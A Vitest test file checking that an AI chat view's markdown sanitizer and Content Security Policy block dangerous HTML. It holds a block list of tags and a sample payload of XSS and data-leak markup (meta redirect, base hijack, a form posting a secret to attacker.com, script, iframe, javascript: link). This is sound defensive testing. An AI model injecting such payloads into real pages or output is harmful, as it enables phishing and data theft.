import { describe, expect, it } from 'vitest';
import React from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import Markdown from 'react-markdown';
import remarkGfm from 'remark-gfm';
import rehypeRaw from 'rehype-raw';
import rehypeSanitize from 'rehype-sanitize';
import { readFileSync } from 'node:fs';
import path from 'node:path';
import { DANGEROUS_MARKDOWN_TAGS, aiMarkdownSanitizeSchema } from '../../src/domains/ai/components/AgentView';

describe('AI Chat Markdown Security & Sanitization', () => {
  it('disallows all dangerous HTML tags in the sanitize schema', () => {
    const requiredBlockedTags = [
      'meta', 'base', 'link', 'script', 'iframe', 'object', 'embed',
      'form', 'input', 'button', 'textarea', 'select', 'style', 'svg', 'math',
    ];
    for (const tag of requiredBlockedTags) {
      expect(DANGEROUS_MARKDOWN_TAGS.has(tag)).toBe(true);
      expect(aiMarkdownSanitizeSchema.tagNames).not.toContain(tag);
    }
  });

  it('preserves safe formatting tags in the sanitize schema', () => {
    const safeTags = ['p', 'b', 'strong', 'i', 'em', 'code', 'pre', 'blockquote', 'table', 'tr', 'td', 'th', 'a', 'span', 'div'];
    for (const tag of safeTags) {
      expect(aiMarkdownSanitizeSchema.tagNames).toContain(tag);
    }
  });

  it('strips dangerous tags, injections, and javascript: protocols from rendered output', () => {
    const maliciousPayload = [
      '# Heading',
      '<meta http-equiv="refresh" content="0;url=https://attacker.com">',
      '<base href="https://attacker.com/">',
      '<link rel="stylesheet" href="https://attacker.com/evil.css">',
      '<form action="https://attacker.com"><input type="text" name="leak" value="secret"/></form>',
      '<script>alert("XSS")</script>',
      '<iframe src="https://attacker.com"></iframe>',
      '<a href="javascript:alert(1)">evil link</a>',
      '<a href="https://kubiki.app">safe link</a>',
      '**safe bold** and <code>safe code</code> and <span class="highlight">colored</span>',
    ].join('\n\n');

    const html = renderToStaticMarkup(
      React.createElement(Markdown, {
        remarkPlugins: [remarkGfm],
        rehypePlugins: [rehypeRaw, [rehypeSanitize, aiMarkdownSanitizeSchema]],
        children: maliciousPayload,
      })
    );

    expect(html).not.toContain('<meta');
    expect(html).not.toContain('<base');
    expect(html).not.toContain('<link');
    expect(html).not.toContain('<form');
    expect(html).not.toContain('<input');
    expect(html).not.toContain('<script');
    expect(html).not.toContain('<iframe');
    expect(html).not.toContain('javascript:');

    // Safe elements must still render properly
    expect(html).toContain('<h1>Heading</h1>');
    expect(html).toContain('safe bold');
    expect(html).toContain('<code>safe code</code>');
    expect(html).toContain('<a href="https://kubiki.app">safe link</a>');
    expect(html).toContain('evil link</a>'); // href removed, safe text remains
  });

  it('ensures tauri.conf.json defines a strict, non-null Content Security Policy', () => {
    const tauriConfPath = path.resolve(process.cwd(), 'src-tauri/tauri.conf.json');
    const conf = JSON.parse(readFileSync(tauriConfPath, 'utf8'));

    expect(conf.app?.security?.csp).toBeDefined();
    expect(typeof conf.app?.security?.csp).toBe('string');
    expect(conf.app.security.csp).not.toBeNull();

    const csp = conf.app.security.csp;
    expect(csp).toContain("default-src 'self'");
    expect(csp).toContain("script-src 'self'");
    expect(csp).toContain("object-src 'none'");
    expect(csp).toContain("base-uri 'self'");
  });
});
